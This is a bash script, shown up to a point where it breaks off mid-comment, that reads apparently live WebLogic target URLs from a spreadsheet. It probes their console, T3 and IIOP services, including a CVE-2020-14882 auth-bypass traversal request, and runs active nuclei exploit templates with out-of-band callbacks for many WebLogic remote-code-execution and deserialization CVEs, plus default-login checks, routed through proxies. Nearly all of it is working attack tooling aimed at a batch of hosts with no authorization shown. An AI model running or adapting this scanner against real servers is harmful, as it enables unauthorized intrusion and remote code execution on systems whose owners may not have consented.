#!/usr/bin/env bash
set -euo pipefail

###############################################################################
# scan-weblogic.sh
#
# Phase 1: surface detection (HTTP console / T3 / IIOP) per target
# Phase 2: run nuclei templates matched to detected surfaces
# Phase 3: write results back to Excel
#
# Usage:
#   chmod +x scan-weblogic.sh
#   ./scan-weblogic.sh [--dry-run] [--rows 2-79] [--timeout 30] [--rate 5]
#                      [--jobs 8]           # scan N targets concurrently (1=serial)
#                      [--attempts 3]       # retry a batch that returns no results
#                      [--admin-port 9002]  # WebLogic admin-port console (SSL); on
#                      [--no-admin-port]    # by default — disable with this flag
#                      [--no-full-fallback] # disable the WebLogic high/critical
#                                           # fallback sweep (runs when the curated
#                                           #  set finds nothing / no surface; on)
#                      [--full-severity critical,high]  # impact filter for the
#                                           # full sweep (default high+critical)
#
# Requires: nuclei, python3, openpyxl, nc (netcat)
###############################################################################

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXCEL="$SCRIPT_DIR/Weblogic-VN-live-final.xlsx"
CUSTOM_TPL="$SCRIPT_DIR/Nuclei template"
UPSTREAM_TPL="$HOME/nuclei-templates"
WORK_DIR="$SCRIPT_DIR/.scan-work"

ROW_START=2
ROW_END=79
TIMEOUT=30
# Hard cap for each raw surface probe (T3/IIOP/SSL handshake). Kept short and
# SEPARATE from TIMEOUT: a filtered port ignores nc/ncat -w and would otherwise
# hang on the OS connect timeout (~75s) or the 30s TIMEOUT. With 2 probes
# (T3+IIOP) per candidate port, a dead backend costs ~2*PROBE_TIMEOUT, not 60s.
PROBE_TIMEOUT=6
RATE_LIMIT=5
# Max nuclei attempts per surface batch. OAST matchers (DNS/RMI callback) are
# async: a miss on the interactsh poll window shows up as "no results", so re-run
# the batch up to this many times before concluding the target is clean. Only
# retried when a batch yields ZERO findings (a batch with >=1 hit is not re-run).
# Override with --attempts N (1 disables retrying).
NUCLEI_ATTEMPTS=3
# Parallelism: how many targets to scan concurrently in Phase 1 (surface detection)
# and Phase 2 (nuclei). Each target writes its own row{N}.* files, so targets are
# independent. 1 = sequential. Raise for throughput; lower if nuclei — especially
# the full-repo fallback sweep — saturates CPU/RAM/network. Override with --jobs N.
JOBS=8
DRY_RUN=false
PROXY=""
SOCKS=""
SOCKS_AUTH=""
# WebLogic T3/IIOP listen ports to probe when the URL carries no explicit
# WebLogic port (i.e. the URL is on a web port 80/443, typically reverse-proxied).
# T3/IIOP never run on 80/443; the default listen port is 7001 (7002 = SSL,
# which a plaintext probe cannot detect). Override with --t3-ports 7001,7005.
T3_PORTS="7001"
# T3/IIOP SSL binding is chosen automatically from the URL scheme: an https:// URL
# probes T3/IIOP over TLS (ncat --ssl), an http:// URL probes plaintext (nc). The
# same candidate ports are used either way (see --port-scan below); SSL hits are
# reported T3-ssl/IIOP-ssl (detect-only — plaintext nuclei templates can't deliver
# over TLS). SSL probing needs `ncat`.
# Optional T3/IIOP port sweep (--port-scan): also probe this candidate list of
# managed-server ports for T3/IIOP, on top of --t3-ports (reverse-proxied web URL)
# or the URL's own port (explicit-port URL). Catches the case where T3/IIOP live on
# a DIFFERENT port than the HTTP one. Off by default; far noisier/slower (a dead
# host pays ~len(ports)*2*PROBE_TIMEOUT), so enable it on specific suspected hosts.
PORT_SCAN=false
SCAN_PORTS="7001,7002,8001,8002,9001,9002,7003,8080,8443"
# WebLogic Administration Port: when the domain flag "Enable Administration Port"
# is on, the admin console (and all admin traffic) moves to https://host:9002 ONLY
# — SSL-only — and the console is refused/redirected on the normal web port. So a
# web-port console probe misses those hosts entirely. On by default: when no
# console is found on the web port, also probe https://host:ADMIN_PORT/console and
# route the console templates there in Phase 2. Default port 9002 (configurable;
# disable with --no-admin-port).
SCAN_ADMIN_PORT=true
ADMIN_PORT=9002
# Fallback WebLogic sweep. When the curated template set yields NO findings for a
# target — or the target has NO detected attack surface at all (even after the
# optional port sweep) — run the upstream nuclei WebLogic high/critical CVE
# templates that the curated set does not already cover (WLS_SWEEP_HTTP /
# WLS_SWEEP_RAW below). Focused on WebLogic, so fast (~7 templates). On by default;
# disable with --no-full-fallback.
FULL_FALLBACK=true
# Impact filter for the full-sweep fallback: only findings of these severities are
# kept (comma-separated nuclei -severity values). The sweep is both RESTRICTED to
# these severities (fewer templates -> faster) AND its results are re-classified by
# the reported info.severity after the run, so the fallback only ever surfaces
# high-impact findings. Override with --full-severity info,low,medium,high,critical.
FULL_SWEEP_SEVERITY="critical,high"
# Python interpreter used for the Excel read/write phases; must have openpyxl.
# Override if `python3` on PATH lacks it, e.g. PYTHON=/path/to/python3 ./scan...
PYTHON="${PYTHON:-python3}"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --dry-run)   DRY_RUN=true; shift ;;
    --rows)      IFS='-' read -r ROW_START ROW_END <<< "$2"; shift 2 ;;
    --timeout)   TIMEOUT="$2"; shift 2 ;;
    --rate)      RATE_LIMIT="$2"; shift 2 ;;
    --proxy)     PROXY="$2"; shift 2 ;;
    --socks)     SOCKS="$2"; shift 2 ;;
    --socks-auth) SOCKS_AUTH="$2"; shift 2 ;;
    --t3-ports)  T3_PORTS="$2"; shift 2 ;;
    --probe-timeout) PROBE_TIMEOUT="$2"; shift 2 ;;
    --attempts)  NUCLEI_ATTEMPTS="$2"; shift 2 ;;
    --jobs)      JOBS="$2"; shift 2 ;;
    --port-scan) PORT_SCAN=true; shift ;;
    --scan-ports) SCAN_PORTS="$2"; shift 2 ;;
    --admin-port) ADMIN_PORT="$2"; shift 2 ;;
    --no-admin-port) SCAN_ADMIN_PORT=false; shift ;;
    --no-full-fallback) FULL_FALLBACK=false; shift ;;
    --full-severity) FULL_SWEEP_SEVERITY="$2"; shift 2 ;;
    --excel)     EXCEL="$2"; shift 2 ;;
    *)           echo "Unknown option: $1"; exit 1 ;;
  esac
done

if [[ -n "$PROXY" ]]; then
  echo "[*] Proxy: $PROXY (HTTP probes + HTTP nuclei templates only; T3/IIOP go via --socks or direct)"
fi

# `timeout` hard-bounds each raw probe at PROBE_TIMEOUT (nc/ncat -w is ignored
# for connects to filtered hosts). Stock macOS has no `timeout`; use gtimeout or
# fall back to nc/ncat -w (which still can't bound a filtered connect there).
# On Linux `timeout` exists, so probes are reliably capped.
if command -v timeout &>/dev/null; then TO="timeout $PROBE_TIMEOUT"
elif command -v gtimeout &>/dev/null; then TO="gtimeout $PROBE_TIMEOUT"
else TO=""; fi

mkdir -p "$WORK_DIR"

# Concurrency gate for the per-target loops: block until fewer than $JOBS background
# jobs are running. Portable to bash 3.2 (`jobs -rp` is visible inside the command
# substitution here). Rolling semaphore — a new target launches as soon as a slot
# frees; JOBS=1 makes the loops sequential. The per-target functions spawn no
# background jobs of their own, so this count reflects only in-flight targets.
sem_wait() { while [[ $(jobs -rp | wc -l) -ge ${JOBS:-1} ]]; do sleep 0.2; done; }

if [[ -n "$SOCKS" ]]; then
  echo "[*] SOCKS5: $SOCKS (T3/IIOP raw TCP routed through SOCKS)"
  PROXYCHAINS_CONF="$WORK_DIR/proxychains.conf"
  SOCKS_HOST="${SOCKS%%:*}"
  SOCKS_PORT="${SOCKS##*:}"
  if [[ -n "$SOCKS_AUTH" ]]; then
    SOCKS_USER="${SOCKS_AUTH%%:*}"
    SOCKS_PASS="${SOCKS_AUTH#*:}"
    cat > "$PROXYCHAINS_CONF" <<PCEOF
strict_chain
proxy_dns
[ProxyList]
socks5 $SOCKS_HOST $SOCKS_PORT $SOCKS_USER $SOCKS_PASS
PCEOF
  else
    cat > "$PROXYCHAINS_CONF" <<PCEOF
strict_chain
proxy_dns
[ProxyList]
socks5 $SOCKS_HOST $SOCKS_PORT
PCEOF
  fi
fi

# ─── Template classification by DELIVERY protocol ────────────────────────────
#
# HTTP: sends HTTP requests (console path traversal, LFI, JNDI via console)
#       Surface needed: WebLogic Console exposed (/console returns 200/302)
#
# T3:   sends T3 handshake + serialized payload over T3 on same connection
#       Surface needed: T3 protocol open (HELO response)
#
# IIOP: sends GIOP LocateRequest + rebind_any/resolve_any (gadget over IIOP)
#       also probes T3 for version first, so needs T3 + IIOP both open

HTTP_TEMPLATES=(
  "$CUSTOM_TPL/CVE-2021-2109-active-oast.yaml"
  "$UPSTREAM_TPL/http/cves/2020/CVE-2020-14882.yaml"
  "$UPSTREAM_TPL/http/cves/2020/CVE-2020-14883.yaml"
  "$UPSTREAM_TPL/http/cves/2020/CVE-2020-14750.yaml"
  "$UPSTREAM_TPL/http/cves/2022/CVE-2022-21371.yaml"
  "$UPSTREAM_TPL/http/cves/2021/CVE-2021-2135.yaml"
)

T3_TEMPLATES=(
  "$CUSTOM_TPL/CVE-2020-14644-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14825-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2021-2136-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2021-2211-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2021-2394-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2024-20931-active-oast.yaml"
)

# HTTP app-surface — WebLogic HTTP RCE endpoints that a reverse proxy still
# forwards even when /console is hidden or WAF-blocked (wls-wsat, _async, ws_utc).
# Matched to the "HTTP-app" fallback surface (Phase 1 #1). CVE-2014-4210
# (uddiexplorer SSRF) is intentionally excluded: medium impact (SSRF only, no RCE).
HTTP_APP_TEMPLATES=(
  "$UPSTREAM_TPL/http/cves/2017/CVE-2017-10271.yaml"
  "$UPSTREAM_TPL/http/cves/2019/CVE-2019-2725.yaml"
  "$UPSTREAM_TPL/http/cves/2018/CVE-2018-2894.yaml"
)

# IIOP delivery — requires T3 (version probe) + IIOP (payload delivery)
IIOP_TEMPLATES=(
  "$CUSTOM_TPL/CVE-2020-2551-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-2555-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-2883-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14645-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14756-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2020-14841-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2023-21839-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2023-21931-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2024-21006-active-oast.yaml"
  "$CUSTOM_TPL/CVE-2024-21182-active-oast.yaml"
)

# Fallback sweep set: the upstream nuclei WebLogic high/critical CVE templates the
# curated lists above do NOT already run. Split by transport so each is sent to the
# right target (HTTP -> web URL; network/T3 -> host:wlport). Keeps the fallback
# WebLogic-focused and fast (~7 templates) instead of sweeping the whole repo.
WLS_SWEEP_HTTP=(
  "$UPSTREAM_TPL/http/cves/2017/CVE-2017-3506.yaml"                       # WLS wsat/XMLDecoder RCE
  "$UPSTREAM_TPL/http/cves/2019/CVE-2019-2729.yaml"                       # async deser RCE (2725 bypass)
  "$UPSTREAM_TPL/http/cves/2020/CVE-2020-2733.yaml"                       # JSF/ADF RCE
  "$UPSTREAM_TPL/http/default-logins/weblogic/weblogic-weak-login.yaml"   # default/weak console creds
)
WLS_SWEEP_RAW=(
  "$UPSTREAM_TPL/network/cves/2016/CVE-2016-3510.yaml"                    # T3 deser RCE
  "$UPSTREAM_TPL/network/cves/2018/CVE-2018-2628.yaml"                    # T3 deser RCE
  "$UPSTREAM_TPL/network/cves/2018/CVE-2018-2893.yaml"                    # T3 deser RCE
)

# ─── Phase 0: extract targets from Excel ─────────────────────────────────────
TARGETS_FILE="$WORK_DIR/targets.txt"
"$PYTHON" - "$EXCEL" "$ROW_START" "$ROW_END" "$TARGETS_FILE" <<'PYEXTRACT'
import sys, openpyxl
excel, rs, re, out = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4]
wb = openpyxl.load_workbook(excel, read_only=True)
ws = wb.active
lines = []
for row in range(rs, re + 1):
    url = ws.cell(row, 1).value
    if url and str(url).strip():
        lines.append(f"{row}\t{str(url).strip()}")
wb.close()
with open(out, "w") as f:
    f.write("\n".join(lines) + "\n")
print(f"Extracted {len(lines)} targets (rows {rs}-{re})")
PYEXTRACT

TOTAL=$(wc -l < "$TARGETS_FILE" | tr -d ' ')
echo "[*] Targets: $TOTAL"

# ─── Phase 1: surface detection ──────────────────────────────────────────────
echo "[*] Phase 1: surface detection (HTTP console / T3 / IIOP)..."

SURFACE_DIR="$WORK_DIR/surfaces"
mkdir -p "$SURFACE_DIR"

scan_surface() {
  local row="$1" url="$2"
  local host port scheme
  scheme=$(echo "$url" | grep -oE '^https?')
  host=$(echo "$url" | sed -E 's|^https?://||;s|[:/].*||')
  port=$(echo "$url" | sed -E 's|^https?://[^:/]*:?||;s|/.*||')
  if [[ -z "$port" ]]; then
    [[ "$scheme" == "https" ]] && port=443 || port=80
  fi

  local result_file="$SURFACE_DIR/row${row}.txt"
  local surfaces=""
  # Base URL the Phase 2 console templates target. Defaults to the web URL; set to
  # https://host:ADMIN_PORT if the console is found on the admin port instead.
  local console_base="$url"
  # Human-readable evidence for each detected surface, written to column E in
  # Phase 3 alongside the machine token (which stays clean for has_surface).
  local reason=""
  addr() { reason="${reason:+$reason$'\n'}• $1"; }

  if $DRY_RUN; then
    echo "HTTP,T3,IIOP" > "$result_file"
    echo "  [row $row] $host:$port -> HTTP,T3,IIOP (dry-run)"
    return
  fi

  # ── HTTP probe: verify the WebLogic admin console is actually here ──
  # Status code alone is not enough: a reverse proxy/portal happily returns
  # 200 or 302 for unrelated content. So classify on code + Location + body:
  #   200 + WebLogic fingerprint in body        -> HTTP (console confirmed)
  #   3xx with Location pointing at console/login -> HTTP (redirect to login)
  #   401/403                                     -> HTTP-restricted
  #       console app is deployed but access-blocked (connection filter / WAF).
  #       The preauth CVEs (14882/14883/14750/21371/2135) are auth-bypass +
  #       path-traversal against internal handlers on a DIFFERENT path than
  #       /console/login, so they may still fire -> keep the HTTP surface so
  #       those templates run; nuclei's OAST confirms if the bypass works.
  #   404/other                                   -> not an HTTP surface
  local console_url="${url%/}/console/login/LoginForm.jsp"
  local curl_proxy=()
  [[ -n "$PROXY" ]] && curl_proxy=(-x "$PROXY")
  local out meta http_code redirect body
  out=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
    --connect-timeout "$PROBE_TIMEOUT" --max-time "$TIMEOUT" \
    -w '__META__%{http_code}\t%{redirect_url}' \
    "$console_url" 2>/dev/null || printf '__META__000\t')
  meta=${out##*__META__}            # "<code>\t<redirect_url>"
  body=${out%__META__*}             # response body (everything before meta)
  http_code=${meta%%$'\t'*}
  redirect=${meta#*$'\t'}

  local wls_fp='WebLogic|j_security_check|console/framework|LoginForm|con_context'
  case "$http_code" in
    200)
      if printf '%s' "$body" | grep -qiE "$wls_fp"; then
        surfaces="HTTP"
        addr "HTTP: /console/login 200 + WebLogic fingerprint in body"
      fi
      ;;
    301|302|303|307|308)
      if printf '%s' "$redirect" | grep -qiE 'console|LoginForm|j_security_check'; then
        surfaces="HTTP"
        addr "HTTP: $http_code redirect to console/login ($redirect)"
      fi
      ;;
    401|403)
      surfaces="HTTP-restricted"
      addr "HTTP-restricted: $http_code on /console/login (console deployed but access-blocked; preauth CVEs may still bypass)"
      ;;
  esac

  # ── HTTP fallback: CVE-2020-14882 path-traversal as a secondary signal ──
  # A WAF may hide /console/login with a fake 404 while the auth-bypass handler
  # on a different path stays reachable. Only runs when the primary probe did
  # NOT already find a console. This GET is benign (loads console.portal, no
  # command execution); a 200 with console markers means the bypass itself
  # fired (console present AND unauth-reachable). Tries single- then
  # double-encoded traversal; a 401/403 here means the console is deployed but
  # the path is blocked/patched.
  if ! echo "$surfaces" | grep -q "HTTP"; then
    local trav_markers='WebLogic|con_context|Change Center|console\.portal|consolejndi'
    local trav_url tout tcode tbody
    for trav_url in \
      "${url%/}/console/css/%2e%2e%2fconsole.portal" \
      "${url%/}/console/images/%252e%252e%252fconsole.portal"; do
      tout=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
        --connect-timeout "$PROBE_TIMEOUT" --max-time "$TIMEOUT" \
        -w '__META__%{http_code}' \
        "$trav_url" 2>/dev/null || printf '__META__000')
      tcode=${tout##*__META__}
      tbody=${tout%__META__*}
      if [[ "$tcode" == "200" ]] && printf '%s' "$tbody" | grep -qiE "$trav_markers"; then
        surfaces="HTTP-bypass"       # auth-bypass handler reachable (likely vuln)
        addr "HTTP-bypass: CVE-2020-14882 traversal returned 200 with console markers ($trav_url)"
        break
      elif [[ "$tcode" == "401" || "$tcode" == "403" ]]; then
        surfaces="HTTP-restricted"   # console deployed but path blocked/patched
        addr "HTTP-restricted: $tcode on 14882 traversal ($trav_url); console deployed but blocked/patched"
        # keep trying the other encoding in case one variant is filtered
      fi
    done
  fi

  # ── Admin-port console (SSL, default 9002) ──
  # When the domain "Enable Administration Port" flag is on, the console lives ONLY
  # at https://host:ADMIN_PORT (SSL) and is refused/redirected on the web port, so
  # the web-port probe above misses it. Probe the admin port when no web-port
  # console was found; on a hit, route the Phase 2 console templates to this base
  # (console_base) instead of the web URL. Admin port is always HTTPS.
  if $SCAN_ADMIN_PORT && ! echo "$surfaces" | grep -q "HTTP"; then
    local admin_base="https://$host:$ADMIN_PORT"
    local a_markers='WebLogic|con_context|Change Center|console\.portal|consolejndi'
    local aout ameta acode aredir abody
    aout=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
      --connect-timeout "$PROBE_TIMEOUT" --max-time "$TIMEOUT" \
      -w '__META__%{http_code}\t%{redirect_url}' \
      "$admin_base/console/login/LoginForm.jsp" 2>/dev/null || printf '__META__000\t')
    ameta=${aout##*__META__}; abody=${aout%__META__*}
    acode=${ameta%%$'\t'*}; aredir=${ameta#*$'\t'}
    case "$acode" in
      200)
        if printf '%s' "$abody" | grep -qiE "$wls_fp"; then
          surfaces="HTTP"; console_base="$admin_base"
          addr "HTTP: admin-port console on :$ADMIN_PORT (200 + WebLogic fingerprint; admin port enabled)"
        fi
        ;;
      301|302|303|307|308)
        if printf '%s' "$aredir" | grep -qiE 'console|LoginForm|j_security_check'; then
          surfaces="HTTP"; console_base="$admin_base"
          addr "HTTP: admin-port :$ADMIN_PORT $acode redirect to console/login ($aredir)"
        fi
        ;;
      401|403)
        surfaces="HTTP-restricted"; console_base="$admin_base"
        addr "HTTP-restricted: $acode on admin-port console :$ADMIN_PORT (deployed but access-blocked)"
        ;;
    esac
    # 14882 traversal on the admin port if the direct probe was inconclusive
    if ! echo "$surfaces" | grep -q "HTTP"; then
      local au atout atcode atbody
      for au in \
        "$admin_base/console/css/%2e%2e%2fconsole.portal" \
        "$admin_base/console/images/%252e%252e%252fconsole.portal"; do
        atout=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
          --connect-timeout "$PROBE_TIMEOUT" --max-time "$TIMEOUT" \
          -w '__META__%{http_code}' "$au" 2>/dev/null || printf '__META__000')
        atcode=${atout##*__META__}; atbody=${atout%__META__*}
        if [[ "$atcode" == "200" ]] && printf '%s' "$atbody" | grep -qiE "$a_markers"; then
          surfaces="HTTP-bypass"; console_base="$admin_base"
          addr "HTTP-bypass: CVE-2020-14882 traversal on admin-port :$ADMIN_PORT returned 200 ($au)"
          break
        elif [[ "$atcode" == "401" || "$atcode" == "403" ]]; then
          surfaces="HTTP-restricted"; console_base="$admin_base"
          addr "HTTP-restricted: $atcode on 14882 traversal admin-port :$ADMIN_PORT"
        fi
      done
    fi
  fi

  # ── HTTP app-surface: WebLogic HTTP RCE endpoints (wls-wsat, _async, ws_utc)
  #    that a reverse proxy still forwards even when /console is hidden or
  #    WAF-blocked. Runs whenever the web port answered at all (http_code != 000)
  #    so it also complements a confirmed console. GETs are benign (no payload);
  #    a WebLogic-specific response marks "HTTP-app" and Phase 2 runs the deser
  #    templates (nuclei's OAST confirms RCE).
  if [[ "$http_code" != "000" ]]; then
    local app_markers='CoordinatorPortType|AsyncResponseService|wls-wsat|ws_utc|WebServiceTestPage|XMLDecoder|faultstring|wsdl:definitions'
    local app_url aout acode abody
    for app_url in \
      "${url%/}/wls-wsat/CoordinatorPortType" \
      "${url%/}/_async/AsyncResponseService" \
      "${url%/}/ws_utc/begin.do"; do
      aout=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
        --connect-timeout "$PROBE_TIMEOUT" --max-time "$TIMEOUT" \
        -w '__META__%{http_code}' \
        "$app_url" 2>/dev/null || printf '__META__000')
      acode=${aout##*__META__}
      abody=${aout%__META__*}
      if [[ "$acode" =~ ^(200|401|403|405|500)$ ]] && printf '%s' "$abody" | grep -qiE "$app_markers"; then
        surfaces="${surfaces:+$surfaces,}HTTP-app"
        addr "HTTP-app: WebLogic HTTP endpoint reachable ($app_url -> $acode)"
        break
      fi
    done
  fi

  # ── T3 / IIOP probe (raw TCP) ──
  # T3/IIOP never listen on web ports (80/443): the HTTP URL port is for HTTP
  # only. For T3/IIOP we probe the real WebLogic listen port -> the URL's
  # explicit port when it is non-web (e.g. :7001, :8081), otherwise the
  # --t3-ports candidates (default 7001). Probing :443 for T3 is meaningless
  # (TLS front of a reverse proxy) and would false-negative away an open 7001.
  # The nuclei T3/IIOP templates are pinned to this same port in Phase 2.
  local nc_cmd="nc -w $PROBE_TIMEOUT"
  if [[ -n "$SOCKS" ]]; then
    nc_cmd="ncat -w $PROBE_TIMEOUT --proxy-type socks5 --proxy $SOCKS"
    [[ -n "$SOCKS_AUTH" ]] && nc_cmd="$nc_cmd --proxy-auth $SOCKS_AUTH"
  fi

  # ncat --ssl connector — probes T3/IIOP over TLS when the URL is https. SSL hits
  # are reported T3-ssl/IIOP-ssl (detect-only: the plaintext nuclei templates can't
  # deliver over TLS — flag for manual ysoserial t3s / corbaloc:iiops). Needs ncat.
  local ssl_cmd=""
  if command -v ncat &>/dev/null; then
    ssl_cmd="ncat --ssl -w $PROBE_TIMEOUT"
    if [[ -n "$SOCKS" ]]; then
      ssl_cmd="ncat --ssl -w $PROBE_TIMEOUT --proxy-type socks5 --proxy $SOCKS"
      [[ -n "$SOCKS_AUTH" ]] && ssl_cmd="$ssl_cmd --proxy-auth $SOCKS_AUTH"
    fi
  fi

  # Build the T3/IIOP candidate port set (same list for http & https; the scheme
  # only decides plaintext-vs-SSL below). HTTP console/app stay on the URL's own
  # port (probed separately above); this is only where to look for T3/IIOP.
  local url_port=""
  [[ "$url" =~ ^https?://[^/]+:([0-9]+) ]] && url_port="${BASH_REMATCH[1]}"
  local pset
  if [[ -n "$url_port" && "$url_port" != "80" && "$url_port" != "443" ]]; then
    # Explicit WebLogic port in the URL: try it FIRST (usually the muxed port).
    # With --port-scan, also sweep the managed-server list in case T3/IIOP live on
    # a DIFFERENT port than the URL's.
    pset="$url_port"
    $PORT_SCAN && pset="$url_port,$T3_PORTS,$SCAN_PORTS"
  else
    # Reverse-proxied web port (80/443): probe --t3-ports, plus the --port-scan list.
    pset="$T3_PORTS"
    $PORT_SCAN && pset="$T3_PORTS,$SCAN_PORTS"
  fi
  # https front on 443: also try 443 itself over TLS (TCP-passthrough LB: T3s rides
  # the HTTPS socket). Only meaningful over SSL, hence https-only.
  [[ "$scheme" == "https" && "$port" == "443" ]] && pset="$pset,443"

  # Dedup (preserve first-seen order; URL's own port stays first -> first match wins).
  local -a cand_ports _raw; local _pp _seen
  IFS=',' read -ra _raw <<< "$pset"
  cand_ports=(); _seen=" "
  for _pp in "${_raw[@]}"; do
    _pp="${_pp// /}"; [[ -z "$_pp" ]] && continue
    [[ "$_seen" == *" $_pp "* ]] && continue
    cand_ports+=("$_pp"); _seen="$_seen$_pp "
  done

  # GIOP 1.2 LocateRequest for object key "NameService"; an open IIOP listener
  # replies with a GIOP LocateReply. A bare header elicits no reply (server
  # waits for the body) -> false negatives. Verified on WLS 12.2.1.4.
  local giop_probe='\x47\x49\x4f\x50\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0b\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65'

  # Probe one port with a given connector command; sets t3_hit / iiop_hit.
  # Match on the FIRST 4 bytes of the reply, not anywhere in it: a WebLogic T3
  # reply starts with "HELO" and an IIOP LocateReply starts with the "GIOP"
  # magic. Grepping anywhere gave false positives because an HTTP server echoes
  # our "GIOP"/handshake bytes back inside its 400 error page (and the SSL probe
  # to an HTTPS :443 would do the same), flagging phantom IIOP.
  local wlport="" sslport="" t3_open="" iiop_open="" t3_ssl="" iiop_ssl="" wl_version="" p t3_hit iiop_hit
  probe_port() {   # $1=port  $2=connector cmd
    local pp="$1" conn="$2" r
    t3_hit=""; iiop_hit=""
    # `|| true`: head closes the pipe (SIGPIPE to the connector) once it has what
    # it needs; with pipefail+set -e that non-zero exit would otherwise abort the
    # scan. T3: read the FIRST LINE — a WebLogic handshake answers
    # "HELO:<version>.<bool>", so `head -n 1` returns the moment that newline
    # arrives; match the HELO prefix AND capture the dotted version (Excel column).
    r=$(echo -ne "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://x:${pp}\n\n" | \
      $TO $conn "$host" "$pp" 2>/dev/null | head -n 1) || true
    if [[ "$r" == HELO* ]]; then
      t3_hit=1
      local _v; _v=$(printf '%s' "$r" | sed -nE 's/^HELO:([0-9]+(\.[0-9]+)*).*/\1/p')
      [[ -n "$_v" && -z "$wl_version" ]] && wl_version="$_v"
    fi
    # IIOP: a GIOP LocateReply starts with the "GIOP" magic (binary, no early
    # newline) — match the first 4 bytes.
    r=$(printf "$giop_probe" | \
      $TO $conn "$host" "$pp" 2>/dev/null | head -c 4) || true
    [[ "$r" == "GIOP" ]] && iiop_hit=1
    return 0
  }

  # Wire chosen by the URL scheme: https -> T3/IIOP over SSL (ncat --ssl); http ->
  # plaintext (nc). --port-scan uses the same wire. A plaintext hit (http) is
  # exploitable by the Phase 2 templates; an SSL hit (https) is detect-only. First
  # candidate port that answers T3/IIOP wins (break).
  local probe_conn="" probe_ssl=""
  if [[ "$scheme" == "https" ]]; then
    if [[ -n "$ssl_cmd" ]]; then
      probe_conn="$ssl_cmd"; probe_ssl=1
    else
      addr "T3/IIOP SSL probe skipped: https target needs ncat (not installed)"
    fi
  else
    probe_conn="$nc_cmd"
  fi

  if [[ -n "$probe_conn" ]]; then
    for p in "${cand_ports[@]}"; do
      p="${p// /}"; [[ -z "$p" ]] && continue
      probe_port "$p" "$probe_conn"
      if [[ -n "$probe_ssl" ]]; then
        [[ -n "$t3_hit" ]] && t3_ssl=1
        [[ -n "$iiop_hit" ]] && iiop_ssl=1
        if [[ -n "$t3_ssl$iiop_ssl" ]]; then sslport="$p"; break; fi
      else
        [[ -n "$t3_hit" ]] && t3_open=1
        [[ -n "$iiop_hit" ]] && iiop_open=1
        if [[ -n "$t3_open$iiop_open" ]]; then wlport="$p"; break; fi
      fi
    done
  fi

  if [[ -n "$t3_open" ]];   then surfaces="${surfaces:+$surfaces,}T3";        addr "T3: HELO handshake on :$wlport"; fi
  if [[ -n "$iiop_open" ]]; then surfaces="${surfaces:+$surfaces,}IIOP";      addr "IIOP: GIOP LocateReply on :$wlport"; fi
  if [[ -n "$t3_ssl" ]];    then surfaces="${surfaces:+$surfaces,}T3-ssl";    addr "T3-ssl: HELO over TLS on :$sslport (detect-only; templates can't deliver over TLS)"; fi
  if [[ -n "$iiop_ssl" ]];  then surfaces="${surfaces:+$surfaces,}IIOP-ssl";  addr "IIOP-ssl: GIOP over TLS on :$sslport (detect-only)"; fi

  [[ -z "$surfaces" ]] && surfaces="NONE"
  [[ "$surfaces" == "NONE" ]] && reason="no HTTP console / HTTP-app / T3 / IIOP surface responded"

  echo "$surfaces" > "$result_file"
  # Human-readable evidence for column E (Phase 3 reads this alongside tokens).
  printf '%s' "$reason" > "$SURFACE_DIR/row${row}.reason"
  # Pin the plaintext WebLogic port for Phase 2 templates (falls back to first).
  echo "${wlport:-${cand_ports[0]}}" > "$SURFACE_DIR/row${row}.wlport"
  # Base URL for Phase 2 console templates (web URL, or the admin port if found there).
  echo "$console_base" > "$SURFACE_DIR/row${row}.consoleurl"
  # WebLogic version parsed from the T3 HELO handshake (empty if not probed); Phase
  # 3 writes it into the Excel "Version" column when non-empty.
  printf '%s' "$wl_version" > "$SURFACE_DIR/row${row}.version"
  local admin_note=""
  [[ "$console_base" != "$url" ]] && admin_note=" console@${console_base}"
  echo "  [row $row] $host (http:$port wl:${wlport:-none}) -> $surfaces${admin_note}${wl_version:+ ver:$wl_version}"
}

while IFS=$'\t' read -r row url <&3; do
  sem_wait
  scan_surface "$row" "$url" &
done 3< "$TARGETS_FILE"
wait 2>/dev/null || true

# ─── Phase 2: nuclei CVE scan per surface ────────────────────────────────────
echo ""
echo "[*] Phase 2: nuclei CVE scan..."

RESULTS_DIR="$WORK_DIR/results"
mkdir -p "$RESULTS_DIR"

# Run a nuclei batch, retrying while it yields NO results (async OAST miss), up to
# $NUCLEI_ATTEMPTS total tries. The matched jsonl is printed to stdout for the
# caller to capture; retry progress goes to stderr so it never lands in the result
# file. "$@" is the full nuclei argv (may be prefixed with a proxychains wrapper).
run_nuclei_retry() {
  local attempt out=""
  for (( attempt = 1; attempt <= NUCLEI_ATTEMPTS; attempt++ )); do
    out=$("$@" </dev/null 2>/dev/null || true)
    [[ -n "$out" ]] && break
    [[ $attempt -lt $NUCLEI_ATTEMPTS ]] && \
      echo "    [row ${row:-?}] no results (attempt $attempt/$NUCLEI_ATTEMPTS), retrying..." >&2
  done
  printf '%s' "$out"
}

# WebLogic high/critical fallback sweep: run the upstream WebLogic CVE templates the
# curated set does not already cover. HTTP templates -> the web URL ($1, via the
# Burp --proxy like the other HTTP runs); network/T3 templates -> host:wlport (via
# proxychains --socks like the other T3/IIOP runs, else direct). Only
# $FULL_SWEEP_SEVERITY findings are kept: the templates are already high/critical,
